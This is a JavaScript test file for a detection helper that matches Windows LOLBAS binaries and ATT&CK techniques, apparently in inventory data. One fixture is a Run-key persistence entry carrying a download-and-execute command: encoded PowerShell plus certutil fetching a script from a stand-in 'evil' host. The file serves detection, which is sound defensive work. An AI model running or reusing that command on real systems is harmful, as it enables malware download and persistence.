import { strict as assert } from "node:assert";

import { describe, it } from "poku";

import { createLolbasProperties, getLolbasMetadata } from "./lolbas.js";

describe("lolbas helpers", () => {
  it("resolves extensionless aliases to canonical LOLBAS executables", () => {
    const metadata = getLolbasMetadata("powershell");
    assert.ok(metadata);
    assert.strictEqual(metadata.canonicalName, "powershell.exe");
    assert.ok(metadata.functions.includes("script-execution"));
    assert.ok(metadata.attackTechniques.includes("T1059.001"));
  });

  it("resolves fully qualified Windows paths", () => {
    const metadata = getLolbasMetadata("C:\\Windows\\System32\\regsvr32.exe");
    assert.ok(metadata);
    assert.strictEqual(metadata.canonicalName, "regsvr32.exe");
    assert.ok(metadata.riskTags.includes("proxy-execution"));
  });

  it("creates aggregated properties for osquery rows with LOLBAS matches", () => {
    const properties = createLolbasProperties("windows_run_keys", {
      description:
        "powershell -enc AAAA; certutil.exe -urlcache -f https://evil/p.ps1 p.ps1",
      key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
    });
    const propertyMap = Object.fromEntries(
      properties.map((property) => [property.name, property.value]),
    );
    assert.strictEqual(propertyMap["cdx:lolbas:matched"], "true");
    assert.ok(propertyMap["cdx:lolbas:names"].includes("powershell.exe"));
    assert.ok(propertyMap["cdx:lolbas:names"].includes("certutil.exe"));
    assert.ok(propertyMap["cdx:lolbas:functions"].includes("download"));
    assert.ok(propertyMap["cdx:lolbas:attackTechniques"].includes("T1059.001"));
    assert.ok(propertyMap["cdx:lolbas:matchFields"].includes("description"));
  });
});
